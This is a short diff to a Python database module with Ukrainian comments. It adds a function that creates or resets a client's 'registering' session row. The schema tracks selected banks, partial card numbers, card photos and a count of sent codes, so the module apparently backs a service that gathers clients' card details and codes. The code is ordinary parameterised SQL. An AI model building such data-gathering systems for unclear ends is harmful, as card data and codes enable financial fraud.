@@ -347,6 +347,29 @@ async def increment_session_sent_codes_count(client_id: int):
         """, (client_id,))
         await db.commit()
 
+async def create_registering_session(client_id: int, username: str):
+    """Створення сесії в статусі заповнення анкети (для відображення на сайті)"""
+    async with aiosqlite.connect(DB_FILE) as db:
+        await db.execute("""
+            INSERT INTO sessions (client_id, username, client_data, status, client_message_id, selected_banks, remaining_banks, success_photo_id, card_first4, card_last4, card_photo_id, sent_codes_count)
+            VALUES (?, ?, '📝 Заповнює реєстраційні дані...', 'registering', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0)
+            ON CONFLICT(client_id) DO UPDATE SET
+                username = excluded.username,
+                client_data = excluded.client_data,
+                line_id = NULL,
+                client_message_id = NULL,
+                selected_banks = NULL,
+                remaining_banks = NULL,
+                status = 'registering',
+                created_at = CURRENT_TIMESTAMP,
+                success_photo_id = NULL,
+                card_first4 = NULL,
+                card_last4 = NULL,
+                card_photo_id = NULL,
+                sent_codes_count = 0
+        """, (client_id, username))
+        await db.commit()
+
 async def create_or_update_session(client_id: int, username: str, client_data: str):
     """Створення нової сесії для клієнта (коли він надсилає свої дані)"""
     async with aiosqlite.connect(DB_FILE) as db:
